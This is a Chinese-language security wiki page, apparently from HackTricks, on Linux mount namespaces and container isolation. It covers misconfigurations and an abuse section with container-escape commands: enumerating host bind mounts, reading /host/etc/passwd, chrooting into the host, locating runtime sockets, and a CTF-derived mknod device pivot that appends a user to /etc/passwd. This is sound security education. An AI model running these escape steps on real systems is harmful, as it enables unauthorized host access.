# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

mount namespace 控制进程所看到的 **mount table**。这是最重要的容器隔离功能之一，因为 root filesystem、bind mounts、tmpfs mounts、procfs view、sysfs exposure 以及许多特定于 runtime 的辅助挂载，都通过该 mount table 表示。两个进程可能都能访问 `/`、`/proc`、`/sys` 或 `/tmp`，但这些路径实际解析到的内容取决于它们所在的 mount namespace。

从 container-security 的角度来看，mount namespace 往往决定了这里是“一个经过妥善准备的 application filesystem”，还是“该进程可以直接查看或影响 host filesystem”。因此，bind mounts、`hostPath` volumes、privileged mount operations，以及可写的 `/proc` 或 `/sys` exposures，都围绕这个 namespace 展开。

## 操作

当 runtime 启动一个 container 时，通常会创建一个新的 mount namespace，为 container 准备 root filesystem，按需挂载 procfs 及其他辅助 filesystems，然后再选择性地添加 bind mounts、tmpfs mounts、secrets、config maps 或 host paths。进程在该 namespace 中运行后，它所看到的 mounts 集合在很大程度上就与 host 的默认视图脱钩了。host 仍然可以看到底层真实 filesystem，但 container 看到的是 runtime 为其组装的版本。

这非常强大，因为它让 container 认为自己拥有独立的 root filesystem，尽管 host 仍在管理一切。但这也很危险，因为如果 runtime 暴露了错误的 mount，该进程就会突然获得对 host resources 的可见性，而 security model 的其他部分可能根本没有被设计为防护这些资源。

## 实验

你可以使用以下命令创建一个 private mount namespace：
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
如果你在该 namespace 外部打开另一个 shell 并检查 mount table，你会看到 tmpfs mount 仅存在于隔离的 mount namespace 中。这是一个很有用的练习，因为它表明 mount isolation 并非抽象理论；kernel 实际上会向进程呈现不同的 mount table。
如果你在该 namespace 外部打开另一个 shell 并检查 mount table，tmpfs mount 只会存在于隔离的 mount namespace 中。

在 containers 中，一个快速对比如下：
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
第二个示例展示了运行时配置如何轻易地在 filesystem boundary 上造成巨大的安全漏洞。

## 运行时使用

Docker、Podman、基于 containerd 的 stack 以及 CRI-O 都依赖私有 mount namespace 来运行普通容器。Kubernetes 也基于相同机制处理 volumes、projected secrets、config maps 以及 `hostPath` mounts。Incus/LXC 环境同样高度依赖 mount namespaces，尤其是因为 system containers 通常会暴露比 application containers 更丰富、更接近真实机器的 filesystems。

这意味着，当你审查容器 filesystem 问题时，通常面对的并不是某个孤立的 Docker 特性，而是通过启动 workload 的平台表现出来的 mount-namespace 和 runtime-configuration 问题。

## 配置错误

最明显且最危险的错误，是通过 bind mount 暴露 host root filesystem 或其他敏感 host path，例如 `-v /:/host`，或者在 Kubernetes 中使用可写的 `hostPath`。此时，问题不再是“容器是否能以某种方式 escape”，而是“已有多少有用的 host 内容可以被直接查看和写入”。可写的 host bind mount 往往会将后续 exploit 变成简单的文件放置、chrooting、config 修改或 runtime socket 发现。

另一个常见问题是以绕过更安全的 container view 的方式暴露 host `/proc` 或 `/sys`。这些 filesystems 并不是普通的数据 mounts，而是进入 kernel 和 process state 的接口。如果 workload 能直接访问 host 版本，那么许多 container hardening 背后的假设就不再适用。

只读保护同样重要。只读 root filesystem 并不会自动保护容器，但它会移除大量 attacker staging space，使 persistence、helper-binary 放置和 config 篡改更加困难。相反，可写的 root 或可写的 host bind mount 会为攻击者准备下一步提供空间。

## 滥用

当 mount namespace 被错误使用时，攻击者通常会采取以下四种做法之一。他们会**读取本应留在容器外部的 host data**，通过可写 bind mounts **修改 host configuration**，在 capabilities 和 seccomp 允许的情况下**挂载或重新挂载其他 resources**，或者**访问 powerful sockets 和 runtime state directories**，借此让 container platform 自身授予他们更多访问权限。

如果容器已经能够查看 host filesystem，那么整个 security model 会立即发生变化。

当你怀疑存在 host bind mount 时，首先确认有哪些内容可用，以及这些内容是否可写：
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
如果主机根文件系统以读写方式挂载，直接访问主机通常很简单：
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
如果目标是获取特权运行时访问权限，而不是直接进行 chroot，请枚举 socket 和运行时状态：
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
如果存在 `CAP_SYS_ADMIN`，还应测试是否可以从容器内部创建新的挂载：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 完整示例：双 Shell `mknod` Pivot

当 container root user 可以创建 block devices、host 与 container 以有用的方式共享 user identity，且 attacker 已经在 host 上取得 low-privilege foothold 时，可能出现一种更具针对性的 abuse path。在这种情况下，container 可以创建诸如 `/dev/sda` 的 device node，之后 low-privilege host user 可以通过匹配的 container process 的 `/proc/<pid>/root/` 读取它。<sup>[[1]](#references)</sup>

在 container 内部：
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
在主机上，定位到容器 shell 的 PID 后，使用匹配的低权限用户：
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
重要的教训并不在于精确的 CTF 字符串搜索，而在于：即使 cgroup device policy 阻止了在 container 内部直接使用，仍然可以通过 `/proc/<pid>/root/` 暴露的 mount-namespace，让 host user 重用由 container 创建的 device nodes。<sup>[[1]](#references)</sup>

## 检查

这些命令用于展示当前进程实际所在的 filesystem 视图。目标是发现源自 host 的 mounts、可写的敏感路径，以及任何看起来比普通 application container root filesystem 更宽泛的内容。
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
这里有哪些值得关注的内容：

- 来自 host 的 Bind mounts，尤其是 `/`、`/proc`、`/sys`、runtime state directories 或 socket locations，应当立即引起注意。
- 意外的 read-write mounts 通常比大量只读 helper mounts 更重要。
- `mountinfo` 通常是判断某个路径是否真正源自 host 或由 overlay 提供的最佳位置。

这些检查可以确定**此 namespace 中可见的资源**、**哪些资源源自 host**，以及**哪些资源可写或涉及安全敏感操作**。

## References

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
